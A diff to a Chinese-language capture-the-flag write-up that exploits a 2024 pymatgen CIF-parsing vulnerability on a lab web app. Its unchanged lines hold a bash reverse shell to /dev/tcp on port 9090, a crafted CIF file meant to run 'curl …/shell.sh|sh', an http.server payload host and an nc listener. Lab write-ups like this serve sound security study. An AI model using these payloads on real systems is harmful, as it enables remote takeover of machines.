@@ -8,16 +8,16 @@
 #### 可以不用加域名，访问5000端口的浏览器
 #### 直接Register注册就可以登录
 #### 手动到here时，会在左下角出现路径/static/example.cif
-
+![喜欢物](images/09020207.png)
 ### 2.与使用 Python 库解析 CIF 文件相关的漏洞的 2024 CVE ID 是什么:
 #### https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
 #### 创建shell.sh文件,这样的9090是反弹shell的端口
 ```
-$ echo -ne '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.56/9090 0>&1"' >shell.sh
+[★]$ echo -ne '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.56/9090 0>&1"' >shell.sh
 ```
 #### 修改为"curl http://10.10.14.56:8989/shell.sh|sh",这样的8989是上传文件的端口
 ```
-$ vi syareya55.cif //看到官方文档的作者改自己名字，so...
+[★]$ vi syareya55.cif //看到官方文档的作者改自己名字，so...
 
 data_5yOhtAoR
 _audit_creation_date            2018-06-08
@@ -35,10 +35,10 @@ _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
 ```
-$ sudo python3 -m http.server 8989
+[★]$ sudo python3 -m http.server 8989
 
-$ sudo apt install rlwrap -y
-$ rlwrap nc -lvnp 9090
+[★]$ sudo apt install rlwrap -y
+[★]$ rlwrap nc -lvnp 9090
 
 ```
 #### 要点击View ,shell.sh会被下载，反向连接会连接上
